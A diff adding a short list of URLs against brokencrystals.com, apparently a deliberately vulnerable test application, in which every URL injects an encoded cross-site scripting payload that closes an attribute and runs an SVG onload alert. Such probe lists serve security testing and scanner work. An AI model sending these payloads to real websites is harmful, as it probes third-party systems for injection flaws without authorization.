@@ -1,0 +1,5 @@
+https://brokencrystals.com/api/file?path=%22%3E%3Csvg+onload%3Dalert(1)%3E&type=%22%3E%3Csvg+onload%3Dalert(1)%3E
+https://stable.brokencrystals.com/api/goto?url=%22%3E%3Csvg+onload%3Dalert(1)%3E
+https://brokencrystals.com/api/file?path=%22%3E%3Csvg+onload%3Dalert(1)%3E&type=%22%3E%3Csvg+onload%3Dalert(1)%3E
+https://brokencrystals.com/api/goto?url=%22%3E%3Csvg+onload%3Dalert(1)%3E
+https://brokencrystals.com/api/testimonials/count?query=%22%3E%3Csvg+onload%3Dalert(1)%3E
